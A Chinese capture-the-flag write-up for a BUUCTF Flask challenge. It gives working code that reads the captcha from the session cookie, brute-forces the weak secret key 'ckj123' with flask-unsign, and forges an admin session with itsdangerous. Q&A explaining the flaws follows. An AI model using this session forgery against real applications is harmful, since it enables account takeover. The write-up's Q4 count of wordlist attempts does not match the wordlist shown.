---
title: "12-admin"
date: 2026-05-03
categories:
 - BUUCTF
 - WEB
---

## Flag

```
flag{bc3d6dfe-bc42-45a8-bdff-cea8989b80f7}
```

## 知识点

- Flask Session 伪造
- Flask session 结构：`{payload}.{timestamp}.{signature}`，使用 URL 安全的 base64 编码。payload 长度可变；timestamp 是 base62 编码的 Unix 时间戳（约 6 字符）；signature 固定 27 字符（HMAC-SHA1 输出 20 bytes / 160 bits，base64 编码后 27 字符）
- Flask 使用 `itsdangerous.URLSafeTimedSerializer` + `TaggedJSONSerializer` 签名 session
- `flask-unsign` 工具：解码和暴力破解 Flask session secret key
- Flask session 压缩：当数据较大时，Flask 会使用 zlib 压缩 session 数据
- 验证码值存储在 Flask session 中，而不是服务端。读取验证码需要"两层" base64 解码，这不是故意设计的双层加密，而是 Flask 的 `TaggedJSONSerializer` 序列化机制导致的：验证码在 session 中是 `bytes` 类型（如 `b'wS3T'`），`TaggedJSONSerializer` 会把 bytes 对象序列化为 `{" b": "<base64>"}` 的标记 JSON 结构，这是第一层 base64；Flask 再把整个 session JSON 做 URL-safe base64 编码写入 cookie，这是第二层
- `/change` 端点根据 `session['name']` 来确定修改哪个用户的密码（不当授权）
- 登录失败时 session 仍会设置 `name` 字段为尝试的用户名

## 解题步骤

### 1. 信息收集

访问首页，得到提示 `<!-- you are not admin -->`，说明需要以 admin 身份登录。

```bash
curl -s "http://1f3ba66d-6213-4166-bc56-2df4c0d4749d.node5.buuoj.cn:81/" | grep "not admin"
```

网站是一个 Flask 应用，可访问的功能：
- `/register` - 注册（需要验证码）
- `/login` - 登录（有 Remember Me 选项）
- `/change` - 返回 302 重定向到 `/login`，说明该端点存在但需要登录

登录成功后，从 `/index` 页面导航菜单中发现更多端点：
- `/index` - 首页，显示 `Hello {{ username }}`
- `/edit` - 发布帖子
- `/change` - 修改密码（表单只有一个 `newpassword` 字段）
- `/logout` - 登出

### 2. 发现验证码漏洞

访问 `/code` 获取验证码，发现 Flask session 中存储了验证码值：

```bash
curl -s -c /tmp/cookie.txt "http://1f3ba66d-6213-4166-bc56-2df4c0d4749d.node5.buuoj.cn:81/code" > /dev/null
cat /tmp/cookie.txt
```

解码 session（双层 base64）：

```python
import base64, json
# session payload 部分 base64 解码
payload = "eyJpbWFnZSI6eyIgYiI6ImQxTXpWQT09In19"  # 示例
decoded = base64.urlsafe_b64decode(payload + "==")
data = json.loads(decoded)
# 内层 base64 解码得到验证码
captcha = base64.b64decode(data['image'][' b'] + "==").decode()
print(captcha)  # 4位验证码
```

### 3. 自动注册账号

利用上述漏洞自动识别验证码并注册：

```python
import requests
from flask_unsign import session as flask_session

BASE = "http://1f3ba66d-6213-4166-bc56-2df4c0d4749d.node5.buuoj.cn:81"
s = requests.Session()

# 获取验证码 session
r = s.get(f"{BASE}/code")
decoded = flask_session.decode(s.cookies.get('session', ''))
captcha = decoded['image'].decode()

# 注册
s.post(f"{BASE}/register", data={
    'username': 'hacker36259',
    'password': 'hack123',
    'verify_code': captcha,
    'submit': 'register'
})

# 登录
s.post(f"{BASE}/login", data={
    'username': 'hacker36259',
    'password': 'hack123'
})
```

### 4. 获取源代码信息

访问 `/change` 页面，HTML 注释中包含源代码地址：

```bash
curl -s "http://xxx.node5.buuoj.cn:81/change" | grep github
# <!-- https://github.com/woadsl1234/hctf_flask/ -->
```

### 5. 破解 Flask Secret Key

使用 `flask-unsign` 暴力破解 session secret key：

```bash
# 安装工具
python3 -m venv /tmp/ctf-venv
source /tmp/ctf-venv/bin/activate
pip install flask-unsign

# 创建字典
cat > /tmp/wordlist.txt << EOF
secret
hctf
admin
hctf2018
flask
key
password
ckj123
EOF

# 破解
flask-unsign --unsign --no-literal-eval \
  --cookie 'eyJjc3JmX3Rva2VuIjp7...' \
  --wordlist /tmp/wordlist.txt
# [+] Found secret key after attempts: b'ckj123'
```

**Secret Key: `ckj123`**

### 6. 伪造 Admin Session

使用 `itsdangerous` 和 Flask 的 `TaggedJSONSerializer` 伪造 admin session：

```python
from itsdangerous import URLSafeTimedSerializer
from flask.json.tag import TaggedJSONSerializer
import hashlib

SECRET = 'ckj123'

# 创建与 Flask 相同的签名器
signer = URLSafeTimedSerializer(
    secret_key=SECRET,
    salt='cookie-session',
    signer_kwargs={'key_derivation': 'hmac', 'digest_method': hashlib.sha1},
    serializer=TaggedJSONSerializer()
)

# 伪造 admin session
forged_session = {
    '_fresh': True,
    '_id': 'bd6558b753c802fc17eec078fee34d7d40365dd730f8c9ff7adb4f8658434b0b1cfcc6db52760f68256be4dd2ee11d5f124046d967c5300a4a20919f1ec02d37',
    'image': 'xxxx',
    'name': 'admin',
    'user_id': '1'
}

admin_cookie = signer.dumps(forged_session)
```

> **`_id` 字段的来源**：`_id` 字段是从合法 session 中直接复制过来的，而且换了多个不同账号登录后发现每个 session 里的 `_id` 值完全相同（都是 `bd6558b753c802fc17eec078fee34d7d40365dd730f8c9ff7adb4f8658434b0b1cfcc6db52760f68256be4dd2ee11d5f124046d967c5300a4a20919f1ec02d37`），说明这个值很可能是硬编码或由固定值算出来的，跟具体用户无关，所以伪造时直接照搬即可。
>
> **`signer.dumps(forged_session)` 做了什么**：`dumps()` 完成三件事——① 用 `TaggedJSONSerializer` 把 Python dict 转成 JSON 字符串（bytes 类型用 `{" b": "..."}` 标记）；② 如果数据较大用 zlib 压缩；③ 用 secret key `ckj123` 对数据做 HMAC 签名，拼成 `数据.时间戳.签名` 的格式。这行代码等于"用偷来的 secret key，按 Flask 原生的方式，捏了一个合法的 admin cookie"，服务器收到后验签通过，就当成了真 session。
>
> **关键点**：必须使用与 Flask 完全一致的签名方式。`flask-unsign --sign` 命令行工具签名格式不正确（会嵌套 JSON 字符串），需要直接在 Python 中使用 `itsdangerous` + `TaggedJSONSerializer` 签名。

### 7. 获取 Flag

使用伪造的 admin session 访问 `/index`：

```python
s = requests.Session()
s.cookies.set('session', admin_cookie)
r = s.get(f"{BASE}/index")
# 响应中包含: <h1 class="nav">Hello admin</h1>
# <h1 class="nav">flag{bc3d6dfe-bc42-45a8-bdff-cea8989b80f7}</h1>
```

## 漏洞总结

1. **验证码失效**：验证码值明文存储在 session cookie 中，可被自动识别
2. **弱 Secret Key**：Flask session 使用弱密钥 `ckj123`，可通过字典攻击破解
3. **Session 可控**：攻击者可以伪造任意用户（包括 admin）的 session
4. **不当授权**：`/change` 端点仅依赖 `session['name']` 来判断修改哪个用户的密码

## 补充问答

### Q1: 解码 session 的目的是什么？

目的是**绕过验证码**。`/code` 返回的是一张图片（GIF），但同时也通过 `Set-Cookie` 把验证码的值写进了 session 里。解码 session 就能直接读出 4 位验证码，不需要 OCR 识别图片。验证码是"防用户不防攻击者"——它在服务端根本没存，而是放在客户端 cookie 中（经过 `TaggedJSONSerializer` 序列化 + Flask session 编码）。攻击者拿到 cookie → 解码 → 取出验证码 → 自动注册，完全不需要人工看图。

### Q2: 你获取的是 cookie，和 session 有什么关系？

在 Flask 里，**cookie 就是 session**。Flask 默认的 session 机制是 client-side session，和其他框架不同：

- **PHP / Java 等**：服务端存储 session 数据，cookie 里只放一个 `session_id`（随机字符串），服务器根据这个 ID 查数据库/缓存获取数据
- **Flask**：session 数据**全部存在 cookie 里**，服务器不存任何东西。cookie 名叫 `session`，它的值就是完整的 session 数据（经过 base64 编码 + 签名）

客户端收到的 `Set-Cookie: session=eyJpbWFnZSI6...` 这个 cookie，就是完整的 session：

```
session=eyJjc3JmX3Rva2VuIjp7IiBiIjoiT1RJNE...   .afZcEA   .C_VOqxA4yDvKv5i_qMJygwSeOBk
        ├────────── payload ──────────────────┘├─时间戳─┘└─────── signature ──────────┘
                  107 字符                           6 字符              27 字符
          (base64 URL-safe, 无填充)          (base62 编码的       (base64 URL-safe, 无填充)
                                               整数, Unix 时间戳)    20 bytes / 160 bits
                                                                   HMAC-SHA1 签名
```

三个部分以点号 `.` 分隔：
- **Payload（第1部分）**：长度不固定，取决于 session 数据量。示例中 107 字符，解码后为 80 bytes 的 JSON 数据
- **Timestamp（第2部分）**：6 字符，base62/base64 编码的整数，解码后为 Unix 时间戳
- **Signature（第3部分）**：固定 27 字符。HMAC-SHA1 输出 20 bytes（160 bits），URL-safe base64 编码后 = ceil(160÷6) = 27 字符（无填充）

解码 payload 就是服务端想"记住"的 session 数据，其中包括了验证码。因为数据全在客户端，Flask 用 secret key 对内容签名来防止用户篡改——但如果 secret key 泄露（比如这道题被破解出 `ckj123`），攻击者就可以伪造任意 session。

### Q3: 为什么是"双层" base64？

准确说不是"故意设计成双层"，而是 Flask 的 `TaggedJSONSerializer` 序列化机制导致的。

Flask session 里存的 `image` 值是 **bytes 类型**（`b'wS3T'`）。`TaggedJSONSerializer` 在序列化 bytes 对象时，会把它转换成带标记的 JSON 结构：

```json
{" b": "<base64编码后的bytes>"}
```

- ` b` 是标记（tag），表示这是一个 bytes 对象
- 值是被 base64 编码过的原始数据

流程如下：

```
原始验证码:  b'wS3T'                           （Python bytes 对象）
    ↓ TaggedJSONSerializer 序列化
中间结构:   {"image": {" b": "d1MzVA=="}}     （tagged JSON，第一层 base64）
    ↓ Flask session 整体 URL-safe base64 编码写入 cookie
最终 cookie: eyJpbWFnZSI6eyIgYiI6...           （第二层 base64）
```

两层 base64 的来源：
1. **内层**：`TaggedJSONSerializer` 把 bytes 编码成 base64 存入 JSON 的 ` b` 字段
2. **外层**：Flask 把整个 session JSON 做 URL-safe base64 编码写入 cookie

所以只要反向解两层 base64 就能读出验证码。

### Q4: 密码字典为什么包含 ckj123？怎么知道要加这个？

是碰运气猜中的，没有什么先验知识，也不是提前知道答案。构造的字典里放了几十个常见 CTF 弱密码组合：`secret`、`hctf`、`admin`、`hctf2018`、`flask`、`password`、`ckj123`……`ckj123` 只是其中一条，格式上就是"字母+123"这种常见弱密码组合。`flask-unsign` 逐个测试，试到第 33 个时命中了。是字典覆盖到了，不是定向命中。

### Q5: session secret key 是干啥用的？

用来**防篡改**的。

因为 Flask 的 session 数据全部放客户端 cookie，用户能直接看到内容（base64 解码就行）。如果只有数据没有签名，用户随便把 `name: user123` 改成 `name: admin` 再 base64 编码回去，服务器就会上当。

所以 Flask 在 cookie 后面加了个**签名**：

```
.session_data.timestamp.signature
        ↑                       ↑
    明文数据                用 secret key 算出的 HMAC 签名
```

服务器收到 cookie 后，用 secret key 重新算一遍签名，跟 cookie 里的签名比对：
- **一致** → 数据没被改过，信任
- **不一致** → 数据被篡改，丢弃

这就意味着：**secret key 一旦泄露，签名就形同虚设**。攻击者拿到 secret key 后，想构造什么 session 就构造什么签名，服务器完全区分不出来。这道题的漏洞本质就是 secret key 太弱（`ckj123`），被字典直接爆了。

### Q6: 伪造 admin session 里的 `_id` 是哪来的？

从合法 session 里直接复制过来的。而且有意思的是——换了 5 个不同账号登录，每个 session 里的 `_id` 都一模一样：

```
ctfuser777:     _id: bd6558b753c802fc17eec078fee...
hacker36259:    _id: bd6558b753c802fc17eec078fee...
attacker69731:  _id: bd6558b753c802fc17eec078fee...
hack16509:      _id: bd6558b753c802fc17eec078fee...
```

不同用户、不同时间登录，`_id` 全是同一个 128 位 hex 字符串。说明这个值很可能是硬编码的或者用固定值算出来的，跟用户无关。所以伪造 admin session 时直接照搬，不需要做任何修改。

### Q7: `admin_cookie = signer.dumps(forged_session)` 是什么意思？

`signer.dumps()` 完成三件事：

1. **序列化**：用 `TaggedJSONSerializer` 把 Python dict 转成 JSON 字符串（bytes 类型用 `{" b": "..."}` 标记）
2. **压缩**：如果数据较大，用 zlib 压缩
3. **签名**：用 `ckj123` 对数据做 HMAC 签名，拼成 `数据.时间戳.签名` 的格式

反过来 `signer.loads(cookie)` 就是验证签名 → 解压 → 反序列化。

所以这行代码等于 **"用偷来的 secret key，按 Flask 原生的方式，捏了一个合法的 admin cookie"**。服务器收到后验签通过，就把它当成真 session 处理。

### Q8: session cookie 三个部分分别对应哪些字符？

以具体 cookie 为例：

```
eyJpbWFnZSI6eyIgYiI6IlRqZzVkdz09In19.afZi0A.INh_Tm4CdxnzFFTWaN25kdt7i4c
```

三个部分以 `.` 分隔：

| 部分 | 值 | 长度 | 说明 |
|------|-----|------|------|
| **Payload** | `eyJpbWFnZSI6eyIgYiI6IlRqZzVkdz09In19` | 36 字符 | URL-safe base64 编码的 JSON 数据，解码后为 `{"image":{" b":"Tjg5dw=="}}`。长度不固定，取决于 session 数据量 |
| **Timestamp** | `afZi0A` | 6 字符 | base62 编码的 Unix 时间戳整数 |
| **Signature** | `INh_Tm4CdxnzFFTWaN25kdt7i4c` | 27 字符 | HMAC-SHA1 签名，原始输出固定 20 bytes（160 bits），URL-safe base64 编码后 = ceil(160÷6) = 27 字符，无填充 |

**总结**：payload 长度可变（上例 36 字符，带 csrf_token 时 107 字符），timestamp 一般 6 字符，**signature 固定 27 字符**。
